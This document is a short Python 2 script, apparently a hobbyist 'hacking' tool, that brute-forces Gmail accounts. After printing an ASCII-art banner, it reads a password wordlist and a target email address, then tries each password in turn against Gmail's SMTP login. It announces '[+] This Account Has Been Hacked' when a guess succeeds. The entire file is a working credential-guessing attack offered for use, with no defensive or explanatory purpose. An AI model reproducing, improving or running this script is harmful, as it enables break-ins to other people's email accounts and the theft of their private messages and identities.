#!/usr/bin/python
'''create by vivek'''

import smtplib
from os import system

def main():
   print '================================================= '
   print '               create by vivek kumar                 '
   print '================================================='
   print '               ++++++++++++++++++++              '
   print '\n                                               '
   print '          _                _    _  ___   ___ _____ '
   print '         | |__   __ _  ___| | _/ |/ _ \ / _ \___  |'
   print '         |  _ \ / _` |/ __| |/ / | (_) | (_) | / / '
   print '         | | | | (_| | (__|   <| |\__, |\__, |/ /  '
   print '         |_| |_|\__,_|\___|_|\_\_|  /_/   /_//_/    '                                                             
   
   print ' \n\n\n                     vivek  '
            
   print '           ()   V.1.0        '

main()
print '[1] start the attack'
print '[2] exit'
option = input('==>')
if option == 1:
   file_path = raw_input('path of passwords file :')
else:
   system('clear')
   exit()
pass_file = open(file_path,'r')
pass_list = pass_file.readlines()
def login():
    i = 0
    user_name = raw_input('target email :')
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.ehlo()
    for password in pass_list:
      i = i + 1
      print str(i) + '/' + str(len(pass_list))
      try:
         server.login(user_name, password)
         system('clear')
         main()
         print '\n'
         print '[+] This Account Has Been Hacked Password :' + password + '     ^_^'
         break
      except smtplib.SMTPAuthenticationError as e:
         error = str(e)
         if error[14] == '<':
            system('clear')
            main()
            print '[+] this account has been hacked, password :' + password + '     ^_^'

            break
         else:
            print '[!] password not found => ' + password
login()
